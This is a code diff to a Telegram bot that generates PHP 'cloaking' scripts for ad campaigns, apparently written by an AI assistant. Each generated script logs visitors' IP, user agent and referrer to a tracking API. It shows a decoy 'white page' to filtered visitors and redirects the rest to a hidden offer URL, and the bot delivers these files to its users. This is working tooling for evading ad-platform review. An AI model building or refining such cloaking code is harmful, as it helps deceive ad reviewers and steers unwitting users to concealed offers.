@@ -90,31 +90,78 @@ async function generateWhitePage(niche, extra = {}) {
     return html;
 }
 
-// ---------- Helper: Generate index.php ----------
+// ---------- Helper: Generate index.php (FIXED) ----------
 function generateIndexPHP(campaign) {
     const { id, offer_url, white_html, clicks_per_ip, clicks_before_filter,
             block_vpn, block_ipv6, block_no_isp, block_no_referrer } = campaign;
+    
+    // Escape white_html for embedding inside PHP HEREDOC
+    const escapedWhiteHtml = white_html.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+    
     return `<?php
 // Cloaking script for campaign: ${id}
 $api_url = "https://${process.env.DOMAIN}/api/track";
 $campaign_id = "${id}";
 $offer_url = "${offer_url}";
-$white_html = ` . '`' . $white_html . '`' . `;
-// ... (rest of detection logic as before)
-// For brevity, use the same index.php generator from earlier answer
-// But here I'll put a minimal working version
-$ip = $_SERVER["REMOTE_ADDR"];
-$ua = $_SERVER["HTTP_USER_AGENT"];
-$data = ["campaign_id"=>$campaign_id, "ip"=>$ip, "user_agent"=>$ua];
+$clicks_per_ip = ${clicks_per_ip || 15};
+$clicks_before_filter = ${clicks_before_filter || 5};
+$block_vpn = ${block_vpn ? 1 : 0};
+$block_ipv6 = ${block_ipv6 ? 1 : 0};
+$block_no_isp = ${block_no_isp ? 1 : 0};
+$block_no_referrer = ${block_no_referrer ? 1 : 0};
+
+// White page HTML
+$white_html = '${escapedWhiteHtml}';
+
+// Get visitor IP
+function getUserIP() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
+    return $_SERVER['REMOTE_ADDR'];
+}
+
+$ip = getUserIP();
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$referrer = $_SERVER['HTTP_REFERER'] ?? '';
+
+// Simple detection (expand as needed)
+$is_vpn = false; // Add VPN detection API if required
+$is_ipv6 = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);
+$has_isp = true; // Placeholder
+$has_referrer = !empty($referrer);
+
+// Decision logic
+$show_offer = true;
+if ($block_vpn && $is_vpn) $show_offer = false;
+if ($block_ipv6 && $is_ipv6) $show_offer = false;
+if ($block_no_isp && !$has_isp) $show_offer = false;
+if ($block_no_referrer && !$has_referrer) $show_offer = false;
+
+// Track click
+$data = [
+    "campaign_id" => $campaign_id,
+    "ip" => $ip,
+    "user_agent" => $user_agent,
+    "decision" => $show_offer ? "main" : "white",
+    "referrer" => $referrer
+];
 $ch = curl_init($api_url);
+curl_setopt($ch, CURLOPT_URL, $api_url);
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
-curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
+curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 2);
 curl_exec($ch);
-// Decision logic (simplified)
-$show_offer = true; // based on your filters
-if($show_offer) header("Location: $offer_url");
-else echo $white_html;
+curl_close($ch);
+
+// Redirect or show white page
+if ($show_offer) {
+    header("Location: $offer_url");
+    exit;
+} else {
+    echo $white_html;
+}
 ?>`;
 }
 
@@ -394,17 +441,17 @@ bot.action(/download_(.+)/, async (ctx) => {
     db.get(`SELECT * FROM campaigns WHERE id = ? AND user_id = ?`, [campaignId, userId], (err, campaign) => {
         if (!campaign) return ctx.reply('Campaign not found.');
         const phpCode = generateIndexPHP(campaign);
-        // Telegram bot can't send files directly via callback, but we can send a link to download endpoint
-        const downloadUrl = `https://${process.env.DOMAIN}/api/campaigns/${campaignId}/download?token=${jwt.sign({ id: userId }, process.env.JWT_SECRET, { expiresIn: '1h' })}`;
-        ctx.reply(`⬇️ Download your index.php:\n${downloadUrl}\n(Link valid for 1 hour)`);
+        // Send as file (Telegram allows small files)
+        const buffer = Buffer.from(phpCode, 'utf-8');
+        ctx.replyWithDocument({ source: buffer, filename: `cloak_${campaignId}.php` });
     });
 });
 
-// Command handlers for non-inline usage
-bot.command('new', (ctx) => ctx.answerCbQuery('Use /start to get menu'));
-bot.command('list', (ctx) => ctx.answerCbQuery('Use /start to get menu'));
-bot.command('stats', (ctx) => ctx.answerCbQuery('Use /start to get menu'));
-bot.command('download', (ctx) => ctx.answerCbQuery('Use /start to get menu'));
+// Command handlers for non-inline usage (optional)
+bot.command('new', (ctx) => ctx.reply('Please use /start to open the menu.'));
+bot.command('list', (ctx) => ctx.reply('Please use /start to open the menu.'));
+bot.command('stats', (ctx) => ctx.reply('Please use /start to open the menu.'));
+bot.command('download', (ctx) => ctx.reply('Please use /start to open the menu.'));
 
 // Set webhook instead of long polling
 const WEBHOOK_PATH = '/telegram-webhook';
